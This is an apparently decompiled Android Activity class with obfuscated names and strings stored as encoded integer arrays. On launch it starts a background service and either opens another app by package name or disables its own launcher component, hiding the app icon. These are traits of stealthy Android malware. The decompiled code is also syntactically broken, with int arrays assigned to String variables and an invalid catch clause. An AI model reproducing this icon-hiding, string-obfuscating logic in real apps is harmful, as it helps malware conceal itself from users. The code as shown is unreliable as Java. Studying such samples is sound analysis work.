package tev.piqgahor;
public class TpB9Gq9SM extends android.app.Activity {

    public TpB9Gq9SM()
    {
        return;
    }

    private static boolean DJtkZGvm(android.content.Context p4, String p5)
    {
        boolean v2_0 = 0;
        if (p5 != null) {
            android.content.pm.PackageManager v0 = p4.getPackageManager();
            android.content.Intent v1_1 = new android.content.Intent("android.intent.action.MAIN");
            v1_1.addCategory("android.intent.category.LAUNCHER");
            v2_0 = tev.piqgahor.TpB9Gq9SM.DJtkZGvm(p4, p5.trim(), v0.queryIntentActivities(v1_1, 0));
        }
        return v2_0;
    }

    private static boolean DJtkZGvm(android.content.Context p7, String p8, java.util.List p9)
    {
        int v3_0 = 0;
        if ((p9 != null) && (!p9.isEmpty())) {
            java.util.Iterator v4_1 = p9.iterator();
            while (v4_1.hasNext()) {
                android.content.pm.ResolveInfo v2_1 = ((android.content.pm.ResolveInfo) v4_1.next());
                if (v2_1 != null) {
                    String v0 = v2_1.activityInfo.packageName.trim();
                    if (p8.equalsIgnoreCase(v0)) {
                        android.content.Intent v1_1 = new android.content.Intent();
                        v1_1.setClassName(v0, v2_1.activityInfo.name.trim());
                        v1_1.setFlags(268435456);
                        try {
                            p7.startActivity(v1_1);
                        } catch (int v3) {
                            tev.piqgahor.mlDMsT43cl.jAkhcYOv07366(18, 3);
                        }
                        tev.piqgahor.mlDMsT43cl.jAkhcYOv07366(18, 4);
                        v3_0 = 1;
                        break;
                    }
                }
            }
        }
        return v3_0;
    }

    protected void onCreate(android.os.Bundle p9)
    {
        super.onCreate(p9);
        String v5_12 = new int[27];
        v5_12 = {41, 132, 118, 138, 146, 151, 128, 151, 141, 134, 73, 121, 123, 120, 112, 123, 106, 118, 73, 120, 121, 110, 119, 73, 74, 74, 74};
        tev.piqgahor.WqukitNJL.VkNmRD0688(tev.piqgahor.WqukitNJL.ZkeTGysUO016(v5_12));
        android.content.Context v3 = this.getApplicationContext();
        android.content.Intent v1_1 = new android.content.Intent(v3, tev.piqgahor.ttnC03lWapO);
        String v5_2 = new int[9];
        v5_2 = {32, 112, 146, 143, 135, 111, 144, 133, 142};
        v1_1.putExtra(tev.piqgahor.WqukitNJL.ZkeTGysUO016(v5_2), 1);
        this.startService(v1_1);
        if (tev.piqgahor.ttnC03lWapO.Ywa694JVQq != null) {
            android.content.Intent v4 = this.getIntent();
            if (v4 != null) {
                String v5_6 = new int[5];
                v5_6 = {26, 142, 147, 138, 127};
                String v2 = v4.getStringExtra(tev.piqgahor.WqukitNJL.ZkeTGysUO016(v5_6));
                if (v2 != null) {
                    String v5_10 = new int[6];
                    v5_10 = {9, 124, 125, 106, 123, 125};
                    if (v2.equals(tev.piqgahor.WqukitNJL.ZkeTGysUO016(v5_10))) {
                        if (!tev.piqgahor.mlDMsT43cl.jAkhcYOv07366(18, 2)) {
                            String v5_18 = new int[32];
                            v5_18 = {31, 122, 108, 128, 136, 141, 118, 141, 131, 124, 63, 110, 143, 132, 141, 63, 133, 145, 142, 140, 63, 130, 135, 132, 130, 138, 132, 145, 63, 64, 64, 64};
                            tev.piqgahor.WqukitNJL.VkNmRD0688(tev.piqgahor.WqukitNJL.ZkeTGysUO016(v5_18));
                        }
                        this.finish();
                        return;
                    }
                }
            }
            tev.piqgahor.TpB9Gq9SM.DJtkZGvm(v3, tev.piqgahor.ttnC03lWapO.Ywa694JVQq);
            this.finish();
        } else {
            v3.getPackageManager().setComponentEnabledSetting(this.getComponentName(), 2, 1);
        }
        return;
    }
}
